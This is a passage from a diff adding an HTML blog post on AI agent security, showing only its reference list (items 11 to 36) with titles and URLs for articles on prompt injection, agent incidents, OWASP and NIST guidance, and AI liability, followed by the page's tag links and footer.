+<a href="https://www.ibm.com/think/topics/alert-fatigue">https://www.ibm.com/think/topics/alert-fatigue</a></p>
+<p>[11] Anthropic Engineering, &ldquo;Beyond permission prompts: making Claude Code more secure and autonomous,&rdquo; 2025.
+<a href="https://www.anthropic.com/engineering/claude-code-sandboxing">https://www.anthropic.com/engineering/claude-code-sandboxing</a></p>
+<p>[12] OWASP, &ldquo;Top 10 for Agentic Applications 2026,&rdquo; Dec. 2025.
+<a href="https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/">https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/</a></p>
+<p>[13] Pillar Security, &ldquo;New Vulnerability in GitHub Copilot and Cursor: How Hackers Can Weaponize Code Agents,&rdquo; Mar. 2025.
+<a href="https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents">https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents</a></p>
+<p>[14] S. Sharwood, &ldquo;Vibe coding service Replit deleted production database,&rdquo; <em>The Register</em>, Jul. 21, 2025.
+<a href="https://www.theregister.com/2025/07/21/replit_saastr_vibe_coding_incident/">https://www.theregister.com/2025/07/21/replit_saastr_vibe_coding_incident/</a></p>
+<p>[15] &ldquo;Hacker inserts destructive code in Amazon Q tool as update goes live,&rdquo; <em>CSO Online</em>, Jul. 2025.
+<a href="https://www.csoonline.com/article/4027963/hacker-inserts-destructive-code-in-amazon-q-as-update-goes-live.html">https://www.csoonline.com/article/4027963/hacker-inserts-destructive-code-in-amazon-q-as-update-goes-live.html</a></p>
+<p>[16] J. Rehberger, &ldquo;GitHub Copilot: Remote Code Execution via Prompt Injection,&rdquo; <em>Embrace The Red</em>, Aug. 2025.
+<a href="https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/">https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/</a></p>
+<p>[17] S. Willison, &ldquo;The Summer of Johann,&rdquo; Aug. 15, 2025.
+<a href="https://simonwillison.net/2025/Aug/15/the-summer-of-johann/">https://simonwillison.net/2025/Aug/15/the-summer-of-johann/</a></p>
+<p>[18] Trail of Bits, &ldquo;Prompt Injection to RCE in AI Agents,&rdquo; Oct. 22, 2025.
+<a href="https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/">https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/</a></p>
+<p>[19] A. Khan, &ldquo;Clinejection,&rdquo; Feb. 2026.
+<a href="https://adnanthekhan.com/posts/clinejection/">https://adnanthekhan.com/posts/clinejection/</a></p>
+<p>[20] S. Sharwood, &ldquo;OpenClaw skills marketplace leaky,&rdquo; <em>The Register</em>, Feb. 5, 2026.
+<a href="https://www.theregister.com/2026/02/05/openclaw_skills_marketplace_leaky_security/">https://www.theregister.com/2026/02/05/openclaw_skills_marketplace_leaky_security/</a></p>
+<p>[21] S. Sharwood, &ldquo;OpenClaw snuck into Cline package,&rdquo; <em>The Register</em>, Feb. 20, 2026.
+<a href="https://www.theregister.com/2026/02/20/openclaw_snuck_into_cline_package/">https://www.theregister.com/2026/02/20/openclaw_snuck_into_cline_package/</a></p>
+<p>[22] S. Willison, &ldquo;The Lethal Trifecta for AI Agents,&rdquo; Jun. 16, 2025.
+<a href="https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/">https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/</a></p>
+<p>[23] Imperva, &ldquo;Cursor&rsquo;s Magic Comes With a Catch: Missing Trust Setting.&rdquo;
+<a href="https://www.imperva.com/blog/cursors-magic-comes-with-a-catch-missing-trust-setting/">https://www.imperva.com/blog/cursors-magic-comes-with-a-catch-missing-trust-setting/</a></p>
+<p>[24] Spacelift, &ldquo;What is Configuration Drift?&rdquo;
+<a href="https://spacelift.io/blog/what-is-configuration-drift">https://spacelift.io/blog/what-is-configuration-drift</a></p>
+<p>[25] Token Security, &ldquo;AI Agent Security Fails: The Identity Configuration Problem.&rdquo;
+<a href="https://www.token.security/blog/blog-ai-agent-security-fails-identity-configuration-problem">https://www.token.security/blog/blog-ai-agent-security-fails-identity-configuration-problem</a></p>
+<p>[26] Anthropic, &ldquo;Claude Code Security Documentation.&rdquo;
+<a href="https://code.claude.com/docs/en/security">https://code.claude.com/docs/en/security</a></p>
+<p>[27] GitHub Issue #6631, anthropics/claude-code, &ldquo;Permission deny not enforced for built-in tools.&rdquo;
+<a href="https://github.com/anthropics/claude-code/issues/6631">https://github.com/anthropics/claude-code/issues/6631</a></p>
+<p>[28] GitHub Issue #24846, anthropics/claude-code.
+<a href="https://github.com/anthropics/claude-code/issues/24846">https://github.com/anthropics/claude-code/issues/24846</a></p>
+<p>[29] Fidelis Security, &ldquo;Signature-Based Detection: Overview and Limitations.&rdquo;
+<a href="https://fidelissecurity.com/threatgeek/network-security/signature-based-detection/">https://fidelissecurity.com/threatgeek/network-security/signature-based-detection/</a></p>
+<p>[30] Claroty Team82, &ldquo;Abusing JSON-Based SQL to Bypass WAF.&rdquo;
+<a href="https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf">https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf</a></p>
+<p>[31] CISA, Application Allowlisting guidance, referenced in OWASP SQL Injection WAF documentation.
+<a href="https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF">https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF</a></p>
+<p>[32] American Bar Association, &ldquo;BC Tribunal Confirms Companies Remain Liable for Information Provided by AI Chatbot,&rdquo; <em>Moffatt v. Air Canada</em>, Feb. 2024.
+<a href="https://www.americanbar.org/groups/business_law/resources/business-law-today/2024-february/bc-tribunal-confirms-companies-remain-liable-information-provided-ai-chatbot/">https://www.americanbar.org/groups/business_law/resources/business-law-today/2024-february/bc-tribunal-confirms-companies-remain-liable-information-provided-ai-chatbot/</a></p>
+<p>[33] Orrick, &ldquo;The EU AI Act: 6 Steps to Take Before 2 August 2026,&rdquo; Nov. 2025.
+<a href="https://www.orrick.com/en/Insights/2025/11/The-EU-AI-Act-6-Steps-to-Take-Before-2-August-2026">https://www.orrick.com/en/Insights/2025/11/The-EU-AI-Act-6-Steps-to-Take-Before-2-August-2026</a></p>
+<p>[34] NIST, &ldquo;Announcing AI Agent Standards Initiative for Interoperable and Secure AI,&rdquo; Feb. 17, 2026.
+<a href="https://www.nist.gov/news-events/news/2026/02/announcing-ai-agent-standards-initiative-interoperable-and-secure">https://www.nist.gov/news-events/news/2026/02/announcing-ai-agent-standards-initiative-interoperable-and-secure</a></p>
+<p>[35] Lathrop GPM, &ldquo;Liability Considerations for Developers and Users of Agentic AI Systems.&rdquo;
+<a href="https://www.lathropgpm.com/insights/liability-considerations-for-developers-and-users-of-agentic-ai-systems/">https://www.lathropgpm.com/insights/liability-considerations-for-developers-and-users-of-agentic-ai-systems/</a></p>
+<p>[36] &ldquo;Vibe Coding Could Cause Catastrophic Explosions in 2026,&rdquo; <em>The New Stack</em>, 2026. Citing Veracode 2025 report.
+<a href="https://thenewstack.io/vibe-coding-could-cause-catastrophic-explosions-in-2026/">https://thenewstack.io/vibe-coding-could-cause-catastrophic-explosions-in-2026/</a></p>
+
+</content>
+<p>
+  
+  <a href="/blog/security/">#Security</a>
+  
+  <a href="/blog/ai/">#Ai</a>
+  
+  <a href="/blog/development/">#Development</a>
+  
+  <a href="/blog/agents/">#Agents</a>
+  
+</p>
+
+  </main>
+  <footer>
+</footer>
+
+    
+</body>
+
+</html>
